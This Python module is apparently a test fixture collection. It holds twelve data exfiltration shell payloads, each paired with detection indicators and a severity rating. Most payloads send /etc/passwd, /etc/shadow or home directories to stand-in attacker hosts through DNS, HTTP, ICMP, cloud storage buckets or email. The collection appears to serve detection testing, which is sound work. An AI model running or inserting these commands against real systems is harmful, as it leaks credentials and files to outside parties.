"""Data exfiltration payload categories - COMPLETE COLLECTION."""

import base64
from typing import List, Dict, Any


class DataExfiltrationPayloads:
    """Complete collection of data exfiltration attack payloads (12 total)."""
    
    @staticmethod
    def get_network_exfiltration_payloads() -> List[Dict[str, Any]]:
        """Get network-based data exfiltration payloads."""
        return [
            {
                "payload": "nslookup $(whoami).attacker.example.com",
                "expected_indicators": ["nslookup", "attacker.example.com", "whoami"],
                "severity": "critical",
                "description": "DNS-based data exfiltration"
            },
            {
                "payload": "curl -X POST -d \"$(cat /etc/passwd)\" http://attacker.example.com/collect",
                "expected_indicators": ["curl", "POST", "/etc/passwd", "attacker.example.com"],
                "severity": "critical",
                "description": "HTTP POST data exfiltration"
            },
            {
                "payload": "wget --post-file=/etc/shadow http://attacker.com/collect",
                "expected_indicators": ["wget", "post-file", "/etc/shadow", "attacker.com"],
                "severity": "critical",
                "description": "wget file upload exfiltration"
            },
            {
                "payload": "ping -c 1 -p $(cat /etc/passwd | head -1 | xxd -p) attacker.com",
                "expected_indicators": ["ping", "/etc/passwd", "xxd", "attacker.com"],
                "severity": "high",
                "description": "ICMP data exfiltration"
            },
        ]
    
    @staticmethod
    def get_encoded_exfiltration_payloads() -> List[Dict[str, Any]]:
        """Get encoded data exfiltration payloads."""
        return [
            {
                "payload": f"echo {base64.b64encode(b'sensitive_data_exfil_test').decode()} | base64 -d",
                "expected_indicators": ["base64", "sensitive_data_exfil_test"],
                "severity": "high",
                "description": "Base64 encoded exfiltration"
            },
            {
                "payload": "cat /etc/passwd | gzip | base64 | curl -X POST -d @- http://attacker.com/",
                "expected_indicators": ["gzip", "base64", "curl", "attacker.com"],
                "severity": "high",
                "description": "Compressed and encoded exfiltration"
            },
        ]
    
    @staticmethod
    def get_covert_channel_payloads() -> List[Dict[str, Any]]:
        """Get covert channel exfiltration payloads."""
        return [
            {
                "payload": "for i in $(cat /etc/passwd); do nslookup $i.data.attacker.com; done",
                "expected_indicators": ["for i", "/etc/passwd", "nslookup", "data.attacker.com"],
                "severity": "high",
                "description": "DNS tunneling exfiltration"
            },
            {
                "payload": "cat /etc/shadow | while read line; do sleep $(echo $line | wc -c); done",
                "expected_indicators": ["cat", "/etc/shadow", "sleep", "wc -c"],
                "severity": "medium",
                "description": "Timing-based covert channel"
            },
        ]
    
    @staticmethod
    def get_cloud_exfiltration_payloads() -> List[Dict[str, Any]]:
        """Get cloud service exfiltration payloads."""
        return [
            {
                "payload": "aws s3 cp /etc/passwd s3://attacker-bucket/stolen-data/",
                "expected_indicators": ["aws s3 cp", "/etc/passwd", "attacker-bucket"],
                "severity": "critical",
                "description": "AWS S3 exfiltration"
            },
            {
                "payload": "gcloud storage cp /etc/shadow gs://attacker-bucket/",
                "expected_indicators": ["gcloud storage", "/etc/shadow", "attacker-bucket"],
                "severity": "critical",
                "description": "Google Cloud Storage exfiltration"
            },
        ]
    
    @staticmethod
    def get_archive_exfiltration_payloads() -> List[Dict[str, Any]]:
        """Get archive-based exfiltration payloads."""
        return [
            {
                "payload": "tar czf - /home/* | curl -X POST --data-binary @- http://attacker.com/upload",
                "expected_indicators": ["tar czf", "/home/*", "curl", "data-binary"],
                "severity": "high",
                "description": "Compressed archive exfiltration"
            },
            {
                "payload": "mail -s 'Exfiltrated Data' attacker@evil.com < /etc/passwd",
                "expected_indicators": ["mail", "attacker@evil.com", "/etc/passwd"],
                "severity": "high",
                "description": "Email-based data exfiltration"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 12 data exfiltration payloads."""
        payloads = []
        payloads.extend(DataExfiltrationPayloads.get_network_exfiltration_payloads())
        payloads.extend(DataExfiltrationPayloads.get_encoded_exfiltration_payloads())
        payloads.extend(DataExfiltrationPayloads.get_covert_channel_payloads())
        payloads.extend(DataExfiltrationPayloads.get_cloud_exfiltration_payloads())
        payloads.extend(DataExfiltrationPayloads.get_archive_exfiltration_payloads())
        return payloads